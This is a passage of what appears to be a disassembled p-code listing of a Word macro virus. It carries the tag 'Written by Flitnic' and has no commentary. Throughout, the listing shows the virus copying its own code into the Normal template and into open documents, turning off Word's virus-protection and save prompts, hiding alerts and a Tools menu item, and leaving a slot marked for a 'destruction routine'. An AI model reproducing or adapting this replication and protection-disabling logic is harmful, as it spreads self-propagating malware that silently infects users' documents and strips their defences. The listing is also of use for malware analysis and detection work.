' 	BoSImplicit 
' 	GoTo AtrNo 
' 	EndIf 
' Line #292:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St at 
' Line #293:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #294:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #295:
' 	CloseAll 
' Line #296:
' 	ExitSub 
' Line #297:
' 	EndIfBlock 
' Line #298:
' 	Label AtrNo 
' Line #299:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lines 
' Line #300:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #301:
' 	LitDI2 0x0001 
' 	Ld FullCode 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #302:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #303:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #304:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #305:
' 	EndIfBlock 
' Line #306:
' 	Ld ActInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #307:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	IfBlock 
' Line #308:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lines 
' Line #309:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #310:
' 	LitDI2 0x0001 
' 	Ld FullCode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #311:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #312:
' 	ElseBlock 
' Line #313:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lines 
' Line #314:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #315:
' 	LitDI2 0x0001 
' 	Ld FullCode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #316:
' 	EndIfBlock 
' Line #317:
' 	EndIfBlock 
' Line #318:
' 	Label esub 
' Line #319:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #320:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #321:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St at 
' Line #322:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #323:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #324:
' 	CloseAll 
' Line #325:
' 	LitStr 0x0009 "c:\vn.dll"
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #326:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo tz2a 
' 	EndIf 
' Line #327:
' 	LitStr 0x0009 "C:\vn.dll"
' 	ArgsCall Kill 0x0001 
' Line #328:
' 	Label tz2a 
' Line #329:
' 	LitStr 0x0009 "c:\vd.dll"
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #330:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo tz2b 
' 	EndIf 
' Line #331:
' 	LitStr 0x0009 "C:\vd.dll"
' 	ArgsCall Kill 0x0001 
' Line #332:
' 	Label tz2b 
' Line #333:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	IfBlock 
' Line #334:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #335:
' 	EndIfBlock 
' Line #336:
' 	Ld windir 
' 	LitStr 0x000F "\system\Log.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #337:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	St lll 
' Line #338:
' 	QuoteRem 0x0000 0x001E "IIS for NormalTemplate Create:"
' Line #339:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #340:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #341:
' 	LitVarSpecial (False)
' 	St aAutoOpen 
' Line #342:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #343:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Ii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #344:
' 	Ld a 
' 	LitStr 0x0009 "Sub IIS()"
' 	Eq 
' 	IfBlock 
' Line #345:
' 	Ld Ii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #346:
' 	LitDI2 0x0001 
' 	Ld cl 
' 	Ld Ii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #347:
' 	LitVarSpecial (True)
' 	St aAutoOpen 
' Line #348:
' 	ExitFor 
' Line #349:
' 	EndIfBlock 
' Line #350:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	NextVar 
' Line #351:
' 	LitDI2 0x0000 
' 	St Ii 
' Line #352:
' 	Ld aAutoOpen 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #353:
' 	CloseAll 
' Line #354:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #355:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	PrintItemSemi 
' 	Ld XXXXX 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #356:
' 	CloseAll 
' Line #357:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #358:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	ArgsCall Kill 0x0001 
' Line #359:
' 	EndIfBlock 
' Line #360:
' 	LitDI2 0x0000 
' 	St iii 
' Line #361:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #362:
' 	Ld iii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #363:
' 	Ld cl 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #364:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	NextVar 
' Line #365:
' 	LitStr 0x0009 "Sub IIS()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #366:
' 	Ld AutoOpenCode 
' 	LitStr 0x0012 "'Macro created by "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #367:
' 	Ld AutoOpenCode 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #368:
' 	LitDI2 0x0001 
' 	Ld AutoOpenCode 
' 	Ld iii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #369:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #370:
' 	QuoteRem 0x0000 0x001E "IIS for ActiveDocument Create:"
' Line #371:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0001 "a"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nomacro 
' 	EndIf 
' Line #372:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St at 
' Line #373:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #374:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nomacro 
' 	EndIf 
' Line #375:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	IfBlock 
' Line #376:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #377:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #378:
' 	LitVarSpecial (False)
' 	St aAutoOpen 
' Line #379:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #380:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #381:
' 	Ld a 
' 	LitStr 0x0009 "Sub IIS()"
' 	Eq 
' 	IfBlock 
' Line #382:
' 	Ld Ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #383:
' 	LitDI2 0x0001 
' 	Ld cl 
' 	Ld Ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #384:
' 	LitVarSpecial (True)
' 	St aAutoOpen 
' Line #385:
' 	ExitFor 
' Line #386:
' 	EndIfBlock 
' Line #387:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	NextVar 
' Line #388:
' 	LitDI2 0x0000 
' 	St Ii 
' Line #389:
' 	Ld aAutoOpen 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #390:
' 	CloseAll 
' Line #391:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #392:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	PrintItemSemi 
' 	Ld XXXXX 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #393:
' 	CloseAll 
' Line #394:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #395:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	ArgsCall Kill 0x0001 
' Line #396:
' 	EndIfBlock 
' Line #397:
' 	LitDI2 0x0000 
' 	St iii 
' Line #398:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #399:
' 	Ld iii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #400:
' 	Ld cl 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #401:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	NextVar 
' Line #402:
' 	LitStr 0x0009 "Sub IIS()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #403:
' 	Ld AutoOpenCode 
' 	LitStr 0x0012 "'Macro created by "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #404:
' 	Ld AutoOpenCode 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #405:
' 	LitDI2 0x0001 
' 	Ld AutoOpenCode 
' 	Ld iii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #406:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #407:
' 	EndIfBlock 
' Line #408:
' 	Label nomacro 
' Line #409:
' Line #410:
' Line #411:
' 	CloseAll 
' Line #412:
' 	Label MegaJump 
' Line #413:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #414:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #415:
' 	OnError (Resume Next) 
' Line #416:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #417:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St at 
' Line #418:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #419:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #420:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #421:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #422:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #423:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #424:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #425:
' 	LitVarSpecial (False)
' 	LitDI2 0x0003 
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #426:
' Line #427:
' 	QuoteRem 0x0000 0x0020 "Insert destruction routine here:"
' Line #428:
' Line #429:
' Line #430:
' 	Label gghh 
' Line #431:
' 	EndSub 
' Line #432:
' 	FuncDefn (Private Sub Document_New())
' Line #433:
' 	Rem 0x000D " MyName = IIS"
' Line #434:
' 	LitStr 0x0009 "c:\No.dat"
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #435:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 "NO.DAT"
' 	Eq 
' 	IfBlock 
' Line #436:
' 	ExitSub 
' Line #437:
' 	EndIfBlock 
' Line #438:
' 	CloseAll 
' Line #439:
' 	OnError MegaJump 
' Line #440:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #441:
' 	Do 
' Line #442:
' 	LitDI2 0x0001 
' 	Ld ms 
' 	LineInput 
' Line #443:
' 	Ld ms 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #444:
' 	Ld ms 
' 	FnLen 
' 	St a 
' Line #445:
' 	Ld ms 
' 	LitDI2 0x0008 
' 	Ld a 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #446:
' 	GoTo fert 
' Line #447:
' 	EndIfBlock 
' Line #448:
' 	Loop 
' Line #449:
' 	CloseAll 
' Line #450:
' 	Label fert 
' Line #451:
' 	CloseAll 
' Line #452:
' 	Ld windir 
' 	LitStr 0x000F "\system\Log.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #453:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "+"
' 	PrintItemNL 
' Line #454:
' 	CloseAll 
' Line #455:
' 	LitVarSpecial (False)
' 	St NormInstalled 
' Line #456:
' 	LitVarSpecial (False)
' 	St ActInstalled 
' Line #457:
' 	LitStr 0x0009 "c:\vn.dll"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #458:
' 	LitStr 0x0009 "c:\vd.dll"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #459:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St NormInst 
' Line #460:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ActInst 
' Line #461:
' 	Ld NormInst 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "REM MYNAME = IIS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstalled 
' 	EndIf 
' Line #462:
' 	Ld ActInst 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "REM MYNAME = IIS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActInstalled 
' 	EndIf 
' Line #463:
' Line #464:
' 	CloseAll 
' Line #465:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitDI2 0x000C 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #466:
' 	LitDI2 0x000C 
' 	Sharp 
' 	Close 0x0001 
' Line #467:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitDI2 0x000C 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #468:
' 	LitDI2 0x000C 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #469:
' 	LitDI2 0x000C 
' 	ArgsLd EOF 0x0001 
' 	If 
' 	BoSImplicit 
' 	GoTo dss 
' 	EndIf 
' Line #470:
' 	LitDI2 0x000C 
' 	Ld a 
' 	LineInput 
' Line #471:
' 	Ld a 
' 	LitStr 0x0013 "@del c:\normalb.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #472:
' 	Loop 
' Line #473:
' 	Label dss 
' Line #474:
' Line #475:
' 	Ld NormInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActIntalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo esub 
' 	EndIf 
' Line #476:
' 	Ld NormInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "C:\vn.dll"
' 	St IW 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0009 "C:\Vd.dll"
' 	St IW 
' 	EndIf 
' Line #477:
' 	Ld IW 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #478:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #479:
' 	Do 
' Line #480:
' 	LitDI2 0x0001 
' 	Ld VirCode 
' 	LineInput 
' Line #481:
' 	Ld VirCode 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	LoopUntil 
' Line #482:
' 	Do 
' Line #483:
' 	Ld VirCode 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ess 
' 	LitDI2 0x0001 
' 	Add 
' 	St ess 
' 	EndIf 
' Line #484:
' 	Ld ess 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo jump 
' 	EndIf 
' Line #485:
' 	LitDI2 0x0001 
' 	Ld VirCode 
' 	LineInput 
' Line #486:
' 	Ld VirCode 
' 	LitStr 0x0016 "Rem Written by Flitnic"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo jump 
' 	EndIf 
' Line #487:
' 	Ld FullCode 
' 	Ld VirCode 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #488:
' 	Loop 
' Line #489:
' 	Label jump 
' Line #490:
' 	Ld FullCode 
' 	Ld VirCode 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #491:
' 	Ld FullCode 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St FullCode 
' Line #492:
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #493:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #494:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AtrNo 
' 	EndIf 
' Line #495:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St at 
' Line #496:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #497:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #498:
' 	CloseAll 
' Line #499:
' 	ExitSub 
' Line #500:
' 	EndIfBlock 
' Line #501:
' 	Label AtrNo 
' Line #502:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lines 
' Line #503:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #504:
' 	LitDI2 0x0001 
' 	Ld FullCode 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #505:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #506:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #507:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #508:
' 	EndIfBlock 
' Line #509:
' 	Ld ActInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #510:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	IfBlock 
' Line #511:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lines 
' Line #512:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #513:
' 	LitDI2 0x0001 
' 	Ld FullCode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #514:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #515:
' 	ElseBlock 
' Line #516:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lines 
' Line #517:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #518:
' 	LitDI2 0x0001 
' 	Ld FullCode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #519:
' 	EndIfBlock 
' Line #520:
' 	EndIfBlock 
' Line #521:
' 	Label esub 
' Line #522:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #523:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #524:
' 	Ld NormalTemplate 
' 	MemLd FullName 
